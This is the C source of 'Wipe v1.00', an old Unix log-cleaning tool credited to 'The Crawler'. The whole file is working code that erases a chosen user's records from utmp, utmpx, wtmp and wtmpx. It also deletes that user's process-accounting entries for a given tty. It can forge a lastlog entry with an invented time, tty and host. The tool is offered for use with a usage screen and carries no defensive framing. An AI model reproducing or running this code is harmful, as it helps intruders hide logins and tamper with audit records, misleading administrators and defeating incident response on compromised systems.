/*
 * Wipe v1.00.
 *
 * Written by The Crawler.
 *
 * Selectively wipe system logs.
 * 
 * Wipes logs on, but not including, Linux, FreeBSD, Sunos 4.x, Solaris 2.x,
 *      Ultrix, AIX, IRIX, Digital UNIX, BSDI, NetBSD, HP/UX.
 */

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/uio.h>
#ifndef NO_ACCT
#include <sys/acct.h>
#endif
#include <utmp.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <ctype.h>
#include <string.h>
#include <pwd.h>
#include <time.h>
#include <stdlib.h>

#ifdef HAVE_LASTLOG_H
#include <lastlog.h>
#endif

#ifdef HAVE_UTMPX
#include <utmpx.h>
#endif

/*
 * Try to use the paths out of the include files. 
 * But if we can't find any, revert to the defaults.
 */
#ifndef UTMP_FILE
#ifdef _PATH_UTMP
#define UTMP_FILE	_PATH_UTMP
#else
#define UTMP_FILE	"/var/adm/utmp"
#endif
#endif 

#ifndef WTMP_FILE
#ifdef _PATH_WTMP
#define WTMP_FILE	_PATH_WTMP
#else
#define WTMP_FILE	"/var/adm/wtmp"
#endif
#endif

#ifndef LASTLOG_FILE
#ifdef _PATH_LASTLOG
#define LASTLOG_FILE	_PATH_LASTLOG
#else
#define LASTLOG_FILE	"/var/adm/lastlog"
#endif
#endif

#ifndef ACCT_FILE
#define ACCT_FILE	"/var/adm/pacct"
#endif

#ifdef HAVE_UTMPX

#ifndef UTMPX_FILE
#define UTMPX_FILE	"/var/adm/utmpx"
#endif

#ifndef WTMPX_FILE
#define WTMPX_FILE	"/var/adm/wtmpx"
#endif

#endif /* HAVE_UTMPX */

#define BUFFSIZE	8192


/* 
 * This function will copy the src file to the dst file.
 */
void
copy_file(char *src, char *dst)
{
	int 	fd1, fd2;
	int	n;
	char	buf[BUFFSIZE];

	if ( (fd1 = open(src, O_RDONLY)) < 0 ) {
		fprintf(stderr, "ERROR: Opening %s during copy.\n", src);
		return;
	}

	if ( (fd2 = open(dst, O_WRONLY | O_CREAT | O_TRUNC)) < 0 ) {
		fprintf(stderr, "ERROR: Creating %s during copy.\n", dst);
		return;
	}
	
	while ( (n = read(fd1, buf, BUFFSIZE)) > 0)
		if (write(fd2, buf, n) != n) {
			fprintf(stderr, "ERROR: Write error during copy.\n");
			return;
		}
		
	if (n < 0) {
		fprintf(stderr, "ERROR: Read error during copy.\n");
		return;
	}

	close(fd1);
	close(fd2);
}


/*
 * UTMP editing.
 */
void
wipe_utmp(char *who, char *line)
{
	int 		fd1;
	struct utmp	ut;
	
	printf("Patching %s .... ", UTMP_FILE);
	fflush(stdout);

	/*
	 * Open the utmp file.
	 */
	if ( (fd1 = open(UTMP_FILE, O_RDWR)) < 0 ) {
		fprintf(stderr, "ERROR: Opening %s\n", UTMP_FILE);
		return;
	}
	
	/*
	 * Copy utmp file excluding relevent entries. 
	 */	
	while ( read(fd1, &ut, sizeof(ut)) > 0) 
		if ( !strncmp(ut.ut_name, who, strlen(who)) )
			if (!line || (line && 
			  !strncmp(ut.ut_line, line, strlen(line)))) {
				bzero((char *) &ut, sizeof(ut));
				lseek(fd1, (int) -sizeof(ut), SEEK_CUR);
				write(fd1, &ut, sizeof(ut));
			}

	close(fd1);

	printf("Done.\n");
}

/*
 * UTMPX editing if supported.
 */
#ifdef HAVE_UTMPX
void
wipe_utmpx(char *who, char *line)
{
	int 		fd1;
	struct utmpx	utx;

	printf("Patching %s .... ", UTMPX_FILE);
	fflush(stdout);
		
	/*
	 * Open the utmp file and temporary file.
	 */
	if ( (fd1 = open(UTMPX_FILE, O_RDWR)) < 0 ) {
		fprintf(stderr, "ERROR: Opening %s\n", UTMPX_FILE);
		return;
	}

	while ( (read(fd1, &utx, sizeof(utx)) ) > 0) 
		if ( !strncmp(utx.ut_name, who, strlen(who)) )
			if (!line || (line && 
			  !strncmp(utx.ut_line, line, strlen(line)))) {
				bzero((char *) &utx, sizeof(utx));
				lseek(fd1, (int) -sizeof(utx), SEEK_CUR);
				write(fd1, &utx, sizeof(utx));
			}

	close(fd1);

	printf("Done.\n");
}
#endif


/*
 * WTMP editing.
 */
void
wipe_wtmp(char *who, char *line)
{
	int		fd1;
	struct utmp	ut;

	printf("Patching %s .... ", WTMP_FILE);
	fflush(stdout);
	
        /*
	 * Open the wtmp file and temporary file.
	 */
	if ( (fd1 = open(WTMP_FILE, O_RDWR)) < 0 ) {
		fprintf(stderr, "ERROR: Opening %s\n", WTMP_FILE);
		return;
	}

	/*
	 * Determine offset of last relevent entry.
	 */
	lseek(fd1, (long) -(sizeof(ut)), SEEK_END);
	while ( (read (fd1, &ut, sizeof(ut))) > 0) {
		if (!strncmp(ut.ut_name, who, strlen(who)))
			if (!line || (line && 
			  !strncmp(ut.ut_line, line, strlen(line)))) {
			  	bzero((char *) &ut, sizeof(ut));
				lseek(fd1, (long) -(sizeof(ut)), SEEK_CUR);
			  	write(fd1, &ut, sizeof(ut));
			  	break;
			}
		lseek(fd1, (long) -(sizeof(ut) * 2), SEEK_CUR);
	}

	close(fd1);
	
	printf("Done.\n");
}


/*
 * WTMPX editing if supported.
 */
#ifdef HAVE_UTMPX
void
wipe_wtmpx(char *who, char *line)
{
	int 		fd1;
	struct utmpx	utx;
	
	printf("Patching %s .... ", WTMPX_FILE);
	fflush(stdout);
	
	/*
	 * Open the utmp file and temporary file.
	 */
	if ( (fd1 = open(WTMPX_FILE, O_RDWR)) < 0 ) {
		fprintf(stderr, "ERROR: Opening %s\n", WTMPX_FILE);
		return;
	}

	/*
	 * Determine offset of last relevent entry.
	 */
	lseek(fd1, (long) -(sizeof(utx)), SEEK_END);
	while ( (read (fd1, &utx, sizeof(utx))) > 0) {
		if (!strncmp(utx.ut_name, who, strlen(who)))
			if (!line || (line && 
			  !strncmp(utx.ut_line, line, strlen(line)))) {
			  	bzero((char *) &utx, sizeof(utx));
				lseek(fd1, (long) -(sizeof(utx)), SEEK_CUR);
			  	write(fd1, &utx, sizeof(utx));
			  	break;
			}
		lseek(fd1, (int) -(sizeof(utx) * 2), SEEK_CUR);
	}

	close(fd1);

	printf("Done.\n");
}
#endif


/*
 * LASTLOG editing.
 */
void
wipe_lastlog(char *who, char *line, char *timestr, char *host)
{
	int		fd1;
	struct lastlog	ll;
	struct passwd	*pwd;
	struct tm	*tm; 
	char		str[4];

	printf("Patching %s .... ", LASTLOG_FILE);
	fflush(stdout);

	tm = (struct tm *) malloc( sizeof(struct tm) );
	
        /*
	 * Open the lastlog file.
	 */
	if ( (fd1 = open(LASTLOG_FILE, O_RDWR)) < 0 ) {
		fprintf(stderr, "ERROR: Opening %s\n", LASTLOG_FILE);
		return;
	}

	if ( (pwd = getpwnam(who)) == NULL) {
		fprintf(stderr, "ERROR: Can't find user in passwd.\n");
		return;
	}
	
	lseek(fd1, (long) pwd->pw_uid * sizeof(struct lastlog), 0);
	bzero((char *) &ll, sizeof(ll));

	if (line) 
		strncpy(ll.ll_line, line, strlen(line));

	if (timestr) {
		/* YYMMddhhmm */
		if (strlen(timestr) != 10) {
			fprintf(stderr, "ERROR: Time format is YYMMddhhmm.\n");
			return;
		}
		
		/*
		 * Extract Times.
		 */
		str[2] = 0;
		str[0] = timestr[0];
		str[1] = timestr[1];
		tm->tm_year = atoi(str);
		
		str[0] = timestr[2];
		str[1] = timestr[3];
		tm->tm_mon = atoi(str) - 1;
		
		str[0] = timestr[4];
		str[1] = timestr[5];
		tm->tm_mday = atoi(str);
		
		str[0] = timestr[6];
		str[1] = timestr[7];
		tm->tm_hour = atoi(str);
		
		str[0] = timestr[8];
		str[1] = timestr[9];
		tm->tm_min = atoi(str);
		tm->tm_sec = 0;
		
		ll.ll_time = mktime(tm);
	}

	if (host)
		strncpy(ll.ll_host, host, sizeof(ll.ll_host));
	

	write(fd1, (char *) &ll, sizeof(ll));

	close(fd1);

	printf("Done.\n");
}


#ifndef NO_ACCT
/*
 * ACCOUNT editing.
 */
void
wipe_acct(char *who, char *line)
{    
	int		fd1, fd2;
	struct acct	ac;
	char		ttyn[50];
	struct passwd   *pwd;
	struct stat	sbuf;
	char		*tmpf;
	
	printf("Patching %s .... ", ACCT_FILE);
	fflush(stdout);

        /*
	 * Open the acct file and temporary file.
	 */
	if ( (fd1 = open(ACCT_FILE, O_RDONLY)) < 0 ) {
		fprintf(stderr, "ERROR: Opening %s\n", ACCT_FILE);
		return;
	}

	/*
	 * Grab a unique temporary filename.
	 */
	tmpf = tmpnam((char *) NULL);

	if ( (fd2 = open(tmpf, O_WRONLY | O_CREAT | O_TRUNC, 600)) < 0 ) {
		fprintf(stderr, "ERROR: Opening tmp ACCT file\n");
		return;
	}

	if ( (pwd = getpwnam(who)) == NULL) {
		fprintf(stderr, "ERROR: Can't find user in passwd.\n");
		return;
	}

	/*
	 * Determine tty's device number
	 */
	strcpy(ttyn, "/dev/");
	strcat(ttyn, line);
	if (stat(ttyn, &sbuf) < 0) {
		fprintf(stderr, "ERROR: Determining tty device number.\n");
		return;
	}
	
	while ( read(fd1, &ac, sizeof(ac)) > 0 ) {
		if ( !(ac.ac_uid == pwd->pw_uid && ac.ac_tty == sbuf.st_rdev) )	
			write(fd2, &ac, sizeof(ac));
	}

	close(fd1);
	close(fd2);
	
	copy_file(tmpf, ACCT_FILE);
	
	if ( unlink(tmpf) < 0 ) {
		fprintf(stderr, "ERROR: Unlinking tmp WTMP file.\n");
		return;
	}

	printf("Done.\n");
} 
#endif


void
usage()
{
	printf("USAGE: wipe [ u|w|l|a ] ...options...\n");
	printf("\n");
	printf("UTMP editing:\n");
	printf("    Erase all usernames      :   wipe u [username]\n");
	printf("    Erase one username on tty:   wipe u [username] [tty]\n");
	printf("\n");
	printf("WTMP editing:\n");
	printf("   Erase last entry for user :   wipe w [username]\n");
	printf("   Erase last entry on tty   :   wipe w [username] [tty]\n");
	printf("\n");	
	printf("LASTLOG editing:\n");
	printf("   Blank lastlog for user    :   wipe l [username]\n");
	printf("   Alter lastlog entry       :   wipe l [username] [tty] [time] [host]\n");
	printf("	Where [time] is in the format [YYMMddhhmm]\n");
	printf("\n");
#ifndef NO_ACCT
	printf("ACCT editing:\n");
	printf("   Erase acct entries on tty :   wipe a [username] [tty]\n");
#endif
	exit(1);
}


int
main(int argc, char *argv[])
{
	char	c;
	
	if (argc < 3)
		usage();

	/*
	 * First character of first argument determines which file to edit.
	 */
	c = toupper(argv[1][0]);
	
	/*
	 * UTMP editing.
	 */
	switch (c) {
		/* UTMP */
		case 'U' :
			if (argc == 3)
				wipe_utmp(argv[2], (char *) NULL);
			if (argc ==4)
				wipe_utmp(argv[2], argv[3]);
			
#ifdef HAVE_UTMPX
			if (argc == 3)
				wipe_utmpx(argv[2], (char *) NULL);
			if (argc == 4)
				wipe_utmpx(argv[2], argv[3]);
#endif
			
			break;
		/* WTMP */
		case 'W' :
			if (argc == 3)
				wipe_wtmp(argv[2], (char *) NULL);
			if (argc == 4)
				wipe_wtmp(argv[2], argv[3]);
			
#ifdef HAVE_UTMPX
			if (argc == 3)
				wipe_wtmpx(argv[2], (char *) NULL);
			if (argc == 4)
				wipe_wtmpx(argv[2], argv[3]);
#endif
			
			break;
		/* LASTLOG */
		case 'L' :
			if (argc == 3)
				wipe_lastlog(argv[2], (char *) NULL, 
					(char *) NULL, (char *) NULL);
			if (argc == 4)
				wipe_lastlog(argv[2], argv[3], (char *) NULL,
						(char *) NULL);
			if (argc == 5)
				wipe_lastlog(argv[2], argv[3], argv[4], 
						(char *) NULL);
			if (argc == 6)
				wipe_lastlog(argv[2], argv[3], argv[4], 
						argv[5]);
			break;
#ifndef NO_ACCT
		/* ACCT */
		case 'A' :
			if (argc != 4)
				usage();
			wipe_acct(argv[2], argv[3]);
			break;
#endif
	}

	return(0);
}

